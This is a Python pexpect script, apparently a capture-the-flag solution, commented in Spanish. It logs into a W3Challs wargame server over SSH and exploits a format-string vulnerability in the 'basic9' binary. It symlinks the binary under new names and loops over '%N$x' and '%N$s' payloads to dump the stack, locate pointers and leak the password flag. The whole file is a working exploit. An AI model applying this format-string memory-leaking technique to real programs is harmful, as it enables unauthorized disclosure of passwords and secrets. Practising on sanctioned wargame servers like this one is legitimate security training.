#!/usr/bin/env python3

import pexpect

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", timeout=30)
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])
print("[✓] Conectado!")

print("\n[*] ESTRATEGIA: El password está en 0x0804a060")
print("[*] Necesito encontrar un puntero a esa dirección o cerca")

child.sendline(b"cd /tmp")
child.expect([b'\\$'])

# Primero, dumpear valores del stack para buscar punteros
print("\n[*] Dumpeando el stack en busca de punteros al BSS...")

for i in range(1, 50):
    cmd = f"ln -sf /home/basic9/basic9 'p{i}' && ./p{i} '%{i}$08x' 2>&1 | head -2".encode()
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=1)
    
    output = child.before
    try:
        output_str = output.decode('utf-8', errors='ignore')
        
        # Buscar valores que parezcan direcciones del BSS (0x0804xxxx)
        if '0804' in output_str:
            lines = output_str.split('\n')
            for line in lines:
                if 'p' in line and '0804' in line and 'ln -sf' not in line:
                    # Extraer el valor hex
                    import re
                    match = re.search(r'p\d+\s+([0-9a-f]{8})', line)
                    if match:
                        hex_val = match.group(1)
                        addr = int(hex_val, 16)
                        
                        # Si está cerca de 0x0804a060
                        if 0x0804a000 <= addr <= 0x0804b000:
                            print(f"[!] Posición {i}: 0x{hex_val} - Posible puntero al BSS")
                            
                            # Intentar leer desde esa dirección
                            cmd2 = f"./p{i} '%{i}$s' 2>&1".encode()
                            child.sendline(cmd2)
                            child.expect([b'\\$', b'W3C'], timeout=2)
                            
                            if b'W3C' in child.before or b'W3C' in child.after:
                                print(f"\n🔥 FLAG ENCONTRADA usando puntero en posición {i} 🔥")
                                output2 = child.before + (child.after if child.after else b'')
                                print(output2.decode('utf-8', errors='ignore'))
                                break
    except:
        pass

print("\n[*] Si no hay punteros directos, intentar otra técnica...")
print("[*] TÉCNICA 2: El programa pasa argv como parámetro a main")
print("[*] argv[0] está en el stack, y podemos leerlo")

# En arquitectura x86, argv suele estar cerca del inicio del stack frame
# Intentar leer argv[0] que es una cadena

for i in range(1, 20):
    cmd = f"ln -sf /home/basic9/basic9 's{i}' && ./s{i} '%{i}$s' 2>&1".encode()
    child.sendline(cmd)
    
    try:
        child.expect([b'\\$', b'Segmentation'], timeout=1)
        output = child.before
        
        if output and len(output) > 10:
            output_str = output.decode('utf-8', errors='ignore')
            
            # Si imprime algo que parece una ruta
            if '/s' in output_str or 'basic9' in output_str:
                print(f"Posición {i}: {output_str[:50]}")
    except:
        pass

print("\n[*] TÉCNICA 3: Tal vez el compilador optimizó y puso password en registros")
print("[*] Los registros se guardan en el stack al entrar a funciones")

# Buscar en posiciones más altas del stack
for i in range(100, 150):
    cmd = f"ln -sf /home/basic9/basic9 'r{i}' && ./r{i} '%{i}$s' 2>&1 | strings | grep -q W3C && echo 'FOUND {i}'".encode()
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=1)
    
    output = child.before
    if b'FOUND' in output:
        print(f"\n[!] Encontrado en posición {i}")
        
        # Obtener la flag completa
        cmd2 = f"./r{i} '%{i}$s' 2>&1 | strings".encode()
        child.sendline(cmd2)
        child.expect([b'\\$'], timeout=2)
        
        output2 = child.before
        print(output2.decode('utf-8', errors='ignore'))
        break

child.close()
print("\n💀 FIN 💀")